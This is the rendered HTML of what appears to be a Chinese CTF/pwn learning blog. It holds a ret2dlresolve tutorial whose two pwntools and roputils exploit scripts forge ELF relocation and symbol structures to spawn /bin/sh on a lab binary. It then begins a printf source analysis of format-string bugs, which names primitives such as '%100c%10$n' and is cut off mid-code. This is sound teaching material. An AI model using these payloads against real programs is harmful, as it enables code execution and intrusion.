class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&quot;./ret2dlresolve&quot;</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./ret2dlresolve&quot;</span>)</span><br><span class="line"></span><br><span class="line">bss_addr = <span class="number">0x0804a000</span></span><br><span class="line">bss_stage = bss_addr + <span class="number">0x800</span></span><br><span class="line"></span><br><span class="line">read_plt = elf.plt[<span class="string">&quot;read&quot;</span>]</span><br><span class="line"></span><br><span class="line">pop_ebp_ret = <span class="number">0x080484eb</span></span><br><span class="line">leave_ret = <span class="number">0x080483a8</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#伪造read(0,bss_stage,100)，同时完成栈转移bss_stage</span></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x28</span>					</span><br><span class="line">payload += p32(bss_stage)			</span><br><span class="line">payload += p32(read_plt)      		</span><br><span class="line">payload += p32(leave_ret)<span class="comment">#read执行完成后，执行leave_ret			</span></span><br><span class="line">payload += p32(<span class="number">0</span>)					</span><br><span class="line">payload += p32(bss_stage)			</span><br><span class="line">payload += p32(<span class="number">100</span>)	</span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(<span class="built_in">len</span>(payload))</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">dynsym = <span class="number">0x080481cc</span></span><br><span class="line">dynstr = <span class="number">0x0804822c</span></span><br><span class="line">plt_0 = <span class="number">0x080482f0</span>	<span class="comment">#plt[0]的第一个地址</span></span><br><span class="line">rel_plt = <span class="number">0x080482b0</span>	<span class="comment">#重定位表的起始地址</span></span><br><span class="line"><span class="comment">#伪造‘重定位表的下标’(.rel.plt)</span></span><br><span class="line">index_offset = (bss_stage + <span class="number">28</span>) - rel_plt <span class="comment">#index_offset =&gt; bss_stage+28</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">fake_sym_addr = bss_stage + <span class="number">36</span> <span class="comment">#伪造Elf_sym的地址：bss_stage+36</span></span><br><span class="line">align = <span class="number">0x10</span> - ((fake_sym_addr - dynsym) &amp; <span class="number">0xf</span>)	<span class="comment">#对齐到0x10字节</span></span><br><span class="line">fake_sym_addr = fake_sym_addr + align</span><br><span class="line"><span class="comment">#伪造‘符号表的下标’(.dynsym)</span></span><br><span class="line">index_dynsym = (fake_sym_addr - dynsym) / <span class="number">0x10</span> <span class="comment">#index_dynsym =&gt; bss_stage+36</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">fake_str_addr = fake_sym_addr + <span class="number">0x10</span> <span class="comment">#伪造str的地址：bss_stage+36+16</span></span><br><span class="line"><span class="comment">#伪造‘字符串表的下标’(.dynstr)</span></span><br><span class="line">st_name = fake_str_addr - dynstr <span class="comment">#st_name =&gt; bss_stage+36+16</span></span><br><span class="line"><span class="comment">#伪造Elf_sym结构体</span></span><br><span class="line">fake_sym = p32(st_name) + p32(<span class="number">0</span>) + p32(<span class="number">0</span>) + p32(<span class="number">0x12</span>) <span class="comment">#长16字节</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">alarm_got = elf.got[<span class="string">&quot;alarm&quot;</span>]</span><br><span class="line"><span class="comment">#利用index_dynsym，逆向运算伪造r_info</span></span><br><span class="line">r_info = (index_dynsym &lt;&lt; <span class="number">8</span>) | <span class="number">0x7</span> <span class="comment">#左移8位，末尾3位全变为1</span></span><br><span class="line"><span class="comment">#伪造Elf_Rel结构体</span></span><br><span class="line">fake_reloc = p32(alarm_got) + p32(r_info)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#payload构造</span></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x4</span>				<span class="comment">#位于bss_stage+0</span></span><br><span class="line">payload += p32(plt_0) 						</span><br><span class="line">payload += p32(index_offset) <span class="comment">#index_offset -&gt; bss_stage+28 -&gt; fake_reloc</span></span><br><span class="line">payload += <span class="string">&#x27;aaaa&#x27;</span></span><br><span class="line">payload += p32(bss_stage+<span class="number">80</span>) <span class="comment">#bss_stage+80 -&gt; /bin/sh</span></span><br><span class="line">payload += <span class="string">&#x27;aaaa&#x27;</span></span><br><span class="line">payload += <span class="string">&#x27;aaaa&#x27;</span></span><br><span class="line">payload += fake_reloc	 			<span class="comment">#位于bss_stage+28</span></span><br><span class="line">payload += <span class="string">&#x27;a&#x27;</span>*align </span><br><span class="line">payload += fake_sym 	 			<span class="comment">#位于bss_stage+36(长16字节)</span></span><br><span class="line">payload += <span class="string">&quot;system\x00&quot;</span> <span class="comment">#伪造函数字符串	    #位于bss_stage+36+16</span></span><br><span class="line">payload = payload.ljust(<span class="number">80</span>,<span class="string">&#x27;a&#x27;</span>) <span class="comment">#补齐80字节</span></span><br><span class="line">payload += <span class="string">&quot;/bin/sh\x00&quot;</span> <span class="comment">#伪造参数字符串	    #位于bss_stage+80</span></span><br><span class="line">payload = payload.ljust(<span class="number">100</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<p>根据 <strong>延迟绑定</strong> 机制，程序第一次调用某个函数时会调用函数 <strong>_dl_runtime_resolve</strong> 来获取它的真实地址，<strong>ret2dlresolve</strong> 也是在这一步动手脚，通过控制栈中的数据来伪造 <strong>_dl_runtime_resolve</strong> 的参数</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x4</span>					</span><br><span class="line">payload += p32(plt_0)			<span class="comment">#伪造link_map				</span></span><br><span class="line">payload += p32(index_offset)	<span class="comment">#伪造reloc_arg </span></span><br></pre></td></tr></table></figure>
<p>ret2dlresolve根据参数reloc_arg可以获取“Elf_Rel”，“Elf_Sym”，“str”等数据的地址</p>
<p>而我们通过栈转移把使<strong>SS:SP</strong>指向fake_stack，然后伪造“Elf_Rel”，“Elf_Sym”，“str”，最后伪造函数reloc_arg来误导程序把“aaaa”重定位成“system(‘/bin/sh’)”</p>
<p>​        //为什么这里是“aaaa”，在最后说明</p>
<p>先看正常的调用栈：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0000</span>| <span class="number">0xffffcf24</span> --&gt; <span class="number">0xf7ffd990</span> --&gt; <span class="number">0x0</span>   	 <span class="comment">//link_map</span></span><br><span class="line"><span class="number">0004</span>| <span class="number">0xffffcf28</span> --&gt; <span class="number">0x8</span> 			 <span class="comment">//reloc_arg</span></span><br><span class="line"><span class="number">0008</span>| <span class="number">0xffffcf2c</span> --&gt; <span class="number">0x0</span> <span class="comment">//返回地址</span></span><br><span class="line"><span class="number">0012</span>| <span class="number">0xffffcf30</span> --&gt; <span class="number">0x0</span> <span class="comment">//参数</span></span><br></pre></td></tr></table></figure>
<p>再看伪造后的调用栈：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0000</span>| bss_stage+<span class="number">4</span>  --&gt; plt_0 --&gt; <span class="number">0x0</span>   	 </span><br><span class="line"><span class="number">0004</span>| bss_stage+<span class="number">8</span>  --&gt; index_offset		</span><br><span class="line"><span class="number">0008</span>| bss_stage+<span class="number">12</span>  --&gt; <span class="string">&#x27;aaaa&#x27;</span> 			</span><br><span class="line"><span class="number">0012</span>| bss_stage+<span class="number">16</span> --&gt; bss_stage+<span class="number">80</span>	--&gt; <span class="string">&quot;/bin/sh\x00&quot;</span>	</span><br></pre></td></tr></table></figure>
<p>伪造reloc_arg为index_offset，欺骗程序把“bss_stage+28”处的内容识别为<strong>Elf_rel</strong></p>
<p>伪造Elf_rel中的r_info，欺骗程序把“bss_stage+36”处的内容识别为<strong>Elf_sym</strong></p>
<p>伪造Elf_sym中的st_name，欺骗程序把“bss_stage+52”处的内容识别为<strong>str</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0000</span>| bss_stage+<span class="number">20</span> --&gt; <span class="string">&#x27;aaaa&#x27;</span></span><br><span class="line"><span class="number">0000</span>| bss_stage+<span class="number">24</span> --&gt; <span class="string">&#x27;aaaa&#x27;</span></span><br><span class="line"><span class="number">0000</span>| bss_stage+<span class="number">28</span> --&gt; fake_reloc-&gt;alarm_got(r_offset)<span class="comment">//伪造Elf_rel</span></span><br><span class="line"><span class="number">0000</span>| bss_stage+<span class="number">32</span> --&gt; fake_reloc-&gt;r_info(r_info)</span><br><span class="line"><span class="number">0000</span>| bss_stage+<span class="number">36</span> --&gt; fake_sym-&gt;st_name(st_name)<span class="comment">//伪造Elf_sym</span></span><br><span class="line"><span class="number">0000</span>| bss_stage+<span class="number">40</span> --&gt; fake_sym-&gt;st_value(<span class="number">0</span>)</span><br><span class="line"><span class="number">0000</span>| bss_stage+<span class="number">44</span> --&gt; fake_sym-&gt;st_size(<span class="number">0</span>)</span><br><span class="line"><span class="number">0000</span>| bss_stage+<span class="number">48</span> --&gt; fake_sym-&gt;st_shndx(<span class="number">0x12</span>)</span><br><span class="line"><span class="number">0000</span>| bss_stage+<span class="number">52</span> --&gt; <span class="string">&quot;system\x00&quot;</span><span class="comment">//伪造str</span></span><br><span class="line"><span class="number">0000</span>| bss_stage+<span class="number">56</span> --&gt; ........  </span><br><span class="line"><span class="number">0000</span>| bss_stage+<span class="number">80</span> --&gt; <span class="string">&quot;/bin/sh\x00&quot;</span>  </span><br></pre></td></tr></table></figure>
<p>一连串的伪造，最终欺骗程序把“aaaa”重定位为“system”，又因为dl_runtime_resolve会在重定位完成以后<strong>重新执行</strong>函数，所以可以获取shell</p>
<p><strong>ret2dlresolve</strong>的利用过程很复杂，需要伪造相关的数据结构，但又比较固定，所以有许多工具来帮助我们实现<strong>ret2dlresolve</strong>，避免繁杂重复的过程</p>
<p>1.Pwntools中有专门针对<strong>ret2dlresolve</strong>的模块 &gt;&gt; <strong>Ret2dlresolvePayload</strong></p>
<p>2.roputils就是为<strong>ret2dlresolve</strong>而生的 </p>
<p>利用工具攻击的exploit：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> roputils</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">offset = <span class="number">44</span></span><br><span class="line">readplt = <span class="number">0x08048300</span></span><br><span class="line">bss = <span class="number">0x0804a020</span></span><br><span class="line">vulFunc = <span class="number">0x0804843B</span> <span class="comment"># Attackeds function</span></span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;./ret2dlresolve&#x27;</span>)</span><br><span class="line"></span><br><span class="line">rop = roputils.ROP(<span class="string">&#x27;./ret2dlresolve&#x27;</span>)<span class="comment"># ROP module + roputils module</span></span><br><span class="line">addr_bss = rop.section(<span class="string">&#x27;.bss&#x27;</span>)</span><br><span class="line"></span><br><span class="line">buf1 = <span class="string">&#x27;A&#x27;</span> * offset </span><br><span class="line">buf1 += p32(readplt) + p32(vulFunc) + p32(<span class="number">0</span>) + p32(addr_bss) + p32(<span class="number">100</span>)</span><br><span class="line"><span class="comment"># fake：read(0,addr_bss,100)</span></span><br><span class="line">p.send(buf1)</span><br><span class="line">					 <span class="comment">#套路固定</span></span><br><span class="line"><span class="comment">#----------------------------------------------------------------#</span></span><br><span class="line">buf2 =  rop.string(<span class="string">&#x27;/bin/sh&#x27;</span>) <span class="comment">#addr_bss+0 -&gt; &#x27;/bin/sh&#x27;</span></span><br><span class="line">buf2 += rop.fill(<span class="number">20</span>, buf2)</span><br><span class="line">buf2 += rop.dl_resolve_data(addr_bss+<span class="number">20</span>, <span class="string">&#x27;system&#x27;</span>) <span class="comment">#addr_bss+20	-&gt; &#x27;system&#x27;</span></span><br><span class="line">buf2 += rop.fill(<span class="number">100</span>, buf2)</span><br><span class="line">p.send(buf2)</span><br><span class="line"><span class="comment">#----------------------------------------------------------------#</span></span><br><span class="line"></span><br><span class="line">buf3 = <span class="string">&#x27;A&#x27;</span>*offset + rop.dl_resolve_call(addr_bss+<span class="number">20</span>, addr_bss)</span><br><span class="line">p.send(buf3)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<p><strong>注意：</strong></p>
<p>32位依照这样打就可以了，但64位在这种情况下，如果像32位一样依次伪造reloc，symtab，strtab，会出错，原因是在_dl_fixup函数执行过程中，访问到了一段未映射的地址处 </p>
<p>本篇博客重点介绍原理，所以就不介绍64位的情况了</p>
<p>今后我会在实战中</p>
<p>参考：</p>
<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/unr4v31/p/15168342.htm">https://www.cnblogs.com/unr4v31/p/15168342.htm</a></p>
<p><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/184099#h3-2">https://www.anquanke.com/post/id/184099#h3-2</a></p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_51868336/article/details/114644569">https://blog.csdn.net/qq_51868336/article/details/114644569</a>  （核心）</p>
<hr>
<p><strong>PS：</strong></p>
<p>为什么程序会调用“aaaa”呢？</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x28</span>					</span><br><span class="line">payload += p32(bss_stage)			</span><br><span class="line">payload += p32(read_plt)      		</span><br><span class="line">payload += p32(leave_ret)		</span><br><span class="line">payload += p32(<span class="number">0</span>)					</span><br><span class="line">payload += p32(bss_stage)			</span><br><span class="line">payload += p32(<span class="number">100</span>)	</span><br></pre></td></tr></table></figure>
<p><strong>read_plt</strong>执行过程中，会输入新的payload到bss_stage中，执行结束后会返回<strong>leave_ret</strong></p>
<p>这里的关键就是<strong>leave_ret</strong>，汇编语言leave本身会“pop ebp”一次，然后ret又一次“pop”控制ip指针</p>
<p>1.leave把bss_stage变为新的ebp，然后重置sp指针，这时bss_stage就是<strong>新的栈</strong>了</p>
<p>2.ret则会把<strong>新的栈</strong>中的栈顶弹入ip指针</p>
<p>而<strong>read_plt</strong>已经提前在它之中写入了数据：（节选）</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x4</span>						  </span><br><span class="line">payload += p32(plt_0) 						</span><br><span class="line">payload += p32(index_offset) </span><br><span class="line">payload += <span class="string">&#x27;aaaa&#x27;</span></span><br><span class="line">payload += p32(bss_stage+<span class="number">80</span>) </span><br></pre></td></tr></table></figure>
<p>所以指令ret会把 <strong>‘aaaa’</strong> 弹到ip寄存器中，而程序没法识别 <strong>‘aaaa’</strong> ，所以会把它当成一个新的函数，然后会调用 <strong>ret2dlresolve</strong> 去尝试重定位这个函数，这时伪装就成功了</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://example.com/2021/12/18/Printf%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="yhellow">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Pwn进你的心">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2021/12/18/Printf%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/" class="post-title-link" itemprop="url">Printf源码分析</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2021-12-18 02:03:06" itemprop="dateCreated datePublished" datetime="2021-12-18T02:03:06+08:00">2021-12-18</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2022-01-04 22:31:15" itemprop="dateModified" datetime="2022-01-04T22:31:15+08:00">2022-01-04</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/SourceCodeAnalysis/" itemprop="url" rel="index"><span itemprop="name">SourceCodeAnalysis</span></a>
                </span>
            </span>

          
            <span class="post-meta-item" title="Symbols count in article">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
              <span>16k</span>
            </span>
            <span class="post-meta-item" title="Reading time">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
              <span>15 mins.</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h2 id="Printf源码分析"><a href="#Printf源码分析" class="headerlink" title="Printf源码分析"></a>Printf源码分析</h2><p><strong>————深入理解格式化字符串漏洞</strong></p>
<p>格式化字符串漏洞一直是我比较头痛的东西</p>
<p>不管是泄露地址还是改写数据，在<strong>IDA</strong>或<strong>gdb</strong>上看到的偏移总是不准确</p>
<p>但最近我想到了可以对照<strong>gdb上看到的地址</strong>和<strong>终端上显示的泄露地址</strong>来寻找偏移的方法：</p>
<p>终端上泄露的地址<strong>偏移准确</strong>，但不清楚是哪个函数的</p>
<p>gdb可以<strong>明确地址背后的函数</strong>，但是偏移计算常常不准确</p>
<p>所以用两者结合分析，就可以获取偏移了</p>
<hr>
<p>我刚开始学习这个漏洞时候，依葫芦画瓢地对比 <strong>printf(buf)</strong> 和 <strong>printf(“%d”,buf)</strong> 的区别，明白了第一个参数是“控制字符串”，然后伪造“控制字符串”来达到目的，接着学到更多的利用技巧，可以解决一些较为复杂的题目了，但是埋藏在我心中的疑问一直没有解决：</p>
<p>“%p”是怎么泄露地址空间的？</p>
<p>“printf”为什么可以自定义参数的数量？</p>
<p>“%100c%10$n”是怎么识别第10个偏移的，为什么输出了100个c对程序没有影响？</p>
<p>说到底，我以前对<strong>格式化字符串漏洞</strong>的学习也只是一种<strong>模仿</strong>，把它当成<strong>黑盒</strong>，达到目的就了事</p>
<p>但不久之前我受到“《汇编语言》-王爽”中<strong>综合研究</strong>的启发，对“printf”有了新的理解</p>
<p>于是我想扒一扒“printf”的运行原理</p>
<hr>
<p><strong>源码：（32位）</strong></p>
<p>​        //64位的源码和32位相比，只有宏定义的部分不同</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;io.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;ctype.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">char</span> *va_list;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> va_round_size(TYPE) (((sizeof(TYPE)+sizeof(int)-1)/sizeof(int))*sizeof(int)) <span class="comment">//4的整数倍</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> va_start(AP,LASTARG)</span></span><br><span class="line">(AP=((<span class="keyword">char</span> *)&amp;(LASTARG)+va_round_size(LASTARG)))</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> va_arg(AP,TYPE) </span></span><br><span class="line">(AP+=va_round_size(TYPE),*((TYPE*)(AP-va_round_size(TYPE)))) </span><br><span class="line"><span class="comment">//得到可变参数的地址，第一次返回时得到第一个参数的地址</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> va_end(AP)</span></span><br><span class="line">(ap=(va_list)<span class="number">0</span>) </span><br><span class="line"><span class="comment">//将释放参数表AP</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ZEROPAD 1</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PLUS 4</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SPACE 8</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> LEFT 16</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SPECIAL 32</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> STDOUT 1</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SMALL 64</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SIGN  2</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">getFieldWidth</span><span class="params">(<span class="keyword">char</span> **str)</span></span>;</span><br><span class="line"><span class="keyword">static</span> <span class="keyword">char</span> printbuf[<span class="number">1024</span>];</span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">char</span> *<span class="title">number</span><span class="params">(<span class="keyword">char</span> *str,<span class="keyword">int</span> num,<span class="keyword">int</span> base,<span class="keyword">int</span> size,<span class="keyword">int</span> precision,<span class="keyword">int</span> type)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">vsprintf</span><span class="params">(<span class="keyword">char</span> *buf,<span class="keyword">const</span> <span class="keyword">char</span> *fmt,va_list args)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">println</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *fmt,...)</span></span>;</span><br><span class="line"><span class="keyword">int</span> __res=<span class="number">0</span>;</span><br><span class="line"><span 